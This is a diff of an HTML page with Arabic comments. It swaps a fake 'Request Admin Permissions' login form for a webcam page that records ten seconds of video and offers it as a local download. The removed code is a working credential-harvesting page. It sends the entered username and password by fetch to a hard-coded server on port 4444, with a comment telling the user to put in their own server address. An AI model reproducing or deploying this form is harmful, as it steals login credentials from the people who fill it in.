@@ -3,54 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Request Admin Permissions</title>
+    <title>Video Recording</title>
 </head>
 <body>
-    <h2>Request Admin Permissions</h2>
-    <form id="adminForm">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required><br><br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br><br>
-        <button type="submit">Submit</button>
-    </form>
+    <h2>Video Recording</h2>
+    <button id="startRecordingButton">Start Recording</button>
+    <div id="videoContainer"></div>
 
     <script>
-        document.getElementById("adminForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // منع السلوك الافتراضي للنموذج
+        document.getElementById('startRecordingButton').addEventListener('click', function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    const videoElement = document.createElement('video');
+                    videoElement.srcObject = stream;
+                    videoElement.autoplay = true;
+                    document.getElementById('videoContainer').appendChild(videoElement);
 
-            const formData = new FormData(this);
+                    // بدء التسجيل
+                    const mediaRecorder = new MediaRecorder(stream);
+                    let chunks = [];
 
-            // استرجاع بيانات المستخدم من النموذج
-            const username = formData.get('username');
-            const password = formData.get('password');
+                    mediaRecorder.ondataavailable = function(event) {
+                        chunks.push(event.data);
+                    };
 
-            // قم بتغيير العنوان IP والبورت بمعلومات الخادم الخاص بك
-            const serverIP = '192.168.0.102';
-            const port = '4444';
+                    mediaRecorder.onstop = function() {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const url = URL.createObjectURL(blob);
 
-            // إرسال البيانات إلى الخادم عبر طلب POST
-            fetch(`http://${serverIP}:${port}/admin/login`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ username, password })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Failed to send data to server.');
-                }
-                return response.text();
-            })
-            .then(data => {
-                alert('Data sent successfully: ' + data);
-                // هنا يمكنك إدراج سلوك إضافي بعد إرسال البيانات بنجاح
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('An error occurred while sending data to server.');
-            });
+                        // عرض الفيديو
+                        const videoDownloadLink = document.createElement('a');
+                        videoDownloadLink.href = url;
+                        videoDownloadLink.download = 'recorded-video.webm';
+                        videoDownloadLink.textContent = 'Download Recorded Video';
+                        document.body.appendChild(videoDownloadLink);
+                    };
+
+                    mediaRecorder.start();
+
+                    // تسجيل الفيديو لمدة 10 ثوانٍ
+                    setTimeout(function() {
+                        mediaRecorder.stop();
+                    }, 10000);
+                })
+                .catch(function(error) {
+                    console.error('Error accessing media devices:', error);
+                });
         });
     </script>
 </body>
